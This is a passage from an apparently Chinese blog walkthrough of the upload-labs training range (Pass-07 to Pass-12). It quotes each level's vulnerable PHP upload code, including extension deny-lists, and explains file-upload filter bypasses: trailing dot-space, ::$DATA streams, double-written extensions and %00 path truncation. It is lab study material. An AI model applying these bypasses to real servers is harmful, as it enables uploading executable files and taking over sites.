(file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>没有去除结尾的” .”（空格+点）,可绕过<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170217501.png" alt="image-20240107170217501"></p><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170307155.png" alt="image-20240107170307155"><br><strong>Pass-08</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>发现没有过滤”::$DATA”<br>Windows解析特点：文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，并不会检测后缀名。<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170314975.png" alt="image-20240107170314975"><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170409789.png" alt="image-20240107170409789"><br><strong>Pass-09</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>该题好像各个方面都防御的很好,但是仔细一看会发现,该题先除去了文件后面的点,再除去空格,这里的操作都是一次,所以可以双写绕过<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170422535.png" alt="image-20240107170422535"></p><p><strong>Pass-10</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>); //如果file_name的值在deny_ext中就替换为空<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>与前几题不同,这里没有过滤”.”,”::$DATA”等,应该上传对象不是windows,而这里的str_ireplace用来把黑名单里的字符替换成空格,且不区分大小,不可通过大小来替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">str_ireplace(find,replace,string,count)<br> 替换字符串中的一些字符（不区分大小写）<br></code></pre></td></tr></table></figure><p>依旧可以双写绕过<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170453506.png" alt="image-20240107170453506"></p><p><strong>Pass-11</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里使用了白名单,只允许jpg,png,gif后缀上传，但是这里通过$img_path &#x3D; $_GET[‘save_path’].”&#x2F;“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;拼接成文件储存路径,可通过00截断进行绕过</p><p>原理:修改后文件储存路径变成.&#x2F;upload&#x2F;4.php%00&#x2F;随机数&#x2F;.jpg</p><p> 而php相关文件函数会认为%00是结束的标志,就成了..&#x2F;upload&#x2F;4.php</p><p>截断条件：<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170600893.png" alt="image-20240107170600893"><br>此处自己没有那么低的php所以偷图来凑</p><p><strong>Pass-12</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传失败&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    